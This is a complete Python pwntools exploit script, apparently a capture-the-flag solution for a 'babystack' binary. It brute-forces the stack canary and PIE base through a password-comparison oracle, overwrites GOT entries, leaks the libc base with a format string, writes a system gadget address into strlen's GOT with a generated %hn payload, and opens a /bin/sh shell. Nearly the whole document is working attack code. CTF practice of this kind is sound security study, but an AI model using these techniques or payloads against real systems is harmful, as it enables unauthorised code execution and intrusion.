from pwn import *

r = process('./babystack_patched')
# r = remote('0.0.0.0', 2006)
bin = ELF('./babystack')
libc = ELF('./libc-2.23.so')
context.clear(os='linux', arch='x86_64', log_level='debug')

# with open('/proc/%d/maps' % r.pid, 'r') as f:
#     bin.address = int(f.read(12), 16)

def login(payload):
    r.sendafter(b'> ', b'1')
    r.sendafter(b'Your password:', payload)

def logout():
    r.sendafter(b'> ', b'1')

def copy(payload):
    r.sendafter(b'> ', b'3')
    r.sendafter(b'Copy :', payload)

def debug():
    gdb.attach(r, '''b*%d''' % (bin.address + 0x1588))

leak_canary = b''
for i in range(16):
    low = 1
    high = 255
    
    while True:
        j = (low + high) // 2
        login(leak_canary+j.to_bytes(1, 'little')+b'\n')
        recv = r.recvline()
        if b'Login Succeeded !\n' == recv:
            leak_canary += j.to_bytes(1, 'little')
            logout()
            break
        elif b'Your password is too small!\n' == recv:
            low = j
        elif b'Your password is too large!\n' == recv:
            high = j

base = leak_canary + b'1'*8
for i in range(6):
    low = 1
    high = 255
    
    while True:
        j = (low + high) // 2
        r.sendafter(b'> ', b'1'*8)
        r.sendafter(b'Your password:', base+j.to_bytes(1, 'little'))

        recv = r.recvline()
        if b'Login Succeeded !\n' == recv:
            base += j.to_bytes(1, 'little')
            logout()
            break
        elif b'Your password is too small!\n' == recv:
            low = j
        elif b'Your password is too large!\n' == recv:
            high = j

bin.address = u64(base[0x18:].ljust(8, b'\x00')) - 0x1120
log.success('PIE: %#x' % bin.address)

payload = b'a'*0x40 + leak_canary + b'a'*0x28 + p64(bin.address+0x14ad)[:-2]
login(payload)
login(b'\n')
copy(b'a')
logout()

payload = b'a'*0x40 + leak_canary + b'a'*0x27 + b'\n'
r.sendafter(b'> ', b'1\n')
r.sendafter(b'Your password:', payload)
login(b'\n')
copy(b'a')
r.sendafter(b'> ', b'1\n')

payload = b'a'*0x40 + leak_canary + b'a'*0x20 + p64(bin.got['strcpy']+0x80)
r.sendafter(b'> ', b'1\n')
r.sendafter(b'Your password:', payload)
login(b'\n')
copy(b'a')
r.sendafter(b'> ', b'1\n')

# debug()
login(b'\n')
r.sendafter(b'> ', b'2')

payload = p64(bin.symbols['login']) + p64(bin.symbols['login']) + p64(bin.plt['write']+6) + \
        p64(bin.plt['printf']+6)
r.sendafter(b'Copy :', payload)

payload = b'%4$p'.ljust(8, b'\x00') + p64(bin.symbols['copy'])
r.sendafter(b'Your password:', payload)
libc.address = int(r.recv(14), 16) - 0x5ed700
log.success('Libc base: %#x' % libc.address)

def gen_payload(l):
    payload = ''
    sum = 0
    value = 0
    for i in l:
        if i[1] == 'hhn':
            if i[0] < (sum & 0xff):
                value = (i[0] - (sum & 0xff)) + 0x100
            else:
                value = i[0] - (sum & 0xff)
        elif i[1] == 'hn':
            if i[0] < (sum & 0xffff):
                value = (i[0] - (sum & 0xffff)) + 0x10000
            else:
                value = i[0] - (sum & 0xffff)
        elif i[1] == 'n':
            if i[0] < (sum & 0xffffffff):
                value = (i[0] - (sum & 0xffffffff)) + 0x100000000
            else:
                value = i[0] - (sum & 0xffffffff)

        sum += value
        payload += f'%{value}c%{i[2]}$' + i[1]

    return payload.encode()

system = libc.address + 0x44e33
part1 = system & 0xffff
part2 = (system >> 16) & 0xffff
part3 = (system >> 32) & 0xffff
payload = gen_payload([[part1, 'hn', 16], [part2, 'hn', 17], [part3, 'hn', 18]]).ljust(0x40, b'\0') + \
        p64(bin.got['strlen']) + p64(bin.got['strlen']+2) + p64(bin.got['strlen']+4)
r.sendafter(b'Your password:', payload)

r.sendafter(b'Your password:', b'/bin/sh\x00')
r.interactive()